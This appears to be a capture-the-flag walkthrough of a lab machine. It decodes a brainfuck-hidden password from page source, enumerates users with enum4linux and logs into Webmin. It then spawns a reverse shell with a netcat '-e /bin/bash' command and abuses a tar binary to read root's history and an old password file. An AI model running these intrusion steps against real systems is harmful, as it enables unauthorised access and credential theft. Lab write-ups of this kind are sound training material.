first run full port scan to know what ports are open, let's run nmap default script to know what services are running on those port.

```shell

cool we now know what services are running on those ports.

Noticed a web server running on port 80, opening it on a browser, we got a default apache webpage. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b292a80-7345-4800-802b-9d03a653e7c8)

checking the source code, we can see a text encoded in brainfuck encryption.

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```
let's decode it 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/bb49abe6-0a9c-4949-9412-05621e589d17)

decoded the text using [decode](https://www.dcode.fr/brainfuck-language). we got `.2uqPEfj3D<P'a-3`. let's enumerate further. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ef6290c5-6d83-4a4e-adfc-977c1a084617)

noticed another web server on port `10000` opening it on a browser, we got redirected to a webmin login page, remember we got a potential password earlier, tried to login admin and using the decoded text as password, it failed.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/31f08e59-b981-4981-8ccc-6b4b63cb08e9)

another webmin server is running on port `20000` tried to login using the same creds as earlier, failed. ðŸ¤” let's enumerate harder. let shoot `enum4linux` to get available users so as to do a username enumeration on the login page.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7605fb0f-3a76-4d09-ac91-1f707b5bc850)

running `enum4linux -a $IP` we got to see a unix user `cyber`. let's try to login the webmin server using this username and the potential password from earlier.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a51d6dbe-d6a6-4bab-b102-2f39502a0418)

Bankai!!! ðŸ”¥ we are able to login to the webmin server on port `20000` using cred `cyber:.2uqPEfj3D<P'a-3`. let's play around and find a way to get shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a5ca8b68-84db-4d84-8b35-547d1f326b16)

clicking on the terminal button, we got into a terminal we can run shell commands on. let's spawn a reverse shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1faffc8d-b063-474f-8fc4-dee4e356b23f)

spawned a reverse shell using `/bin/nc -e /bin/bash $IP $port`


## Privilege Escalation

In the home directory of user `cyber` we can see a binary `tar`. ðŸ¤” it is not an suid, let's see what we can do with this. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c77c0f4d-0e6c-4f0b-99e7-0c22aced217b)

checking gtfobins, we can see that we can read files. ðŸ¤” hmmmmmm

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ccd8a067-5d82-47f7-9c43-bd8059e3232c)

we could read root files without being root using this binary. ðŸ¤” let's try read root `.bash_history` file and see if we can loot anything.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5ee559d4-51e9-436a-b0ab-38e8dfe14f58)

There's a file named `.old_pass.bak` and it is only owned by root, let's check it content since we can read root files. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fbcd7429-d44c-4012-8f79-85369b77b8ac)

checking the content of the file, we got a password, su root using the password and boom we are root.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e4cfbb94-e5af-4214-9f32-26314636866d)

We broke out of the shell ðŸ˜œ Interesting yeah?
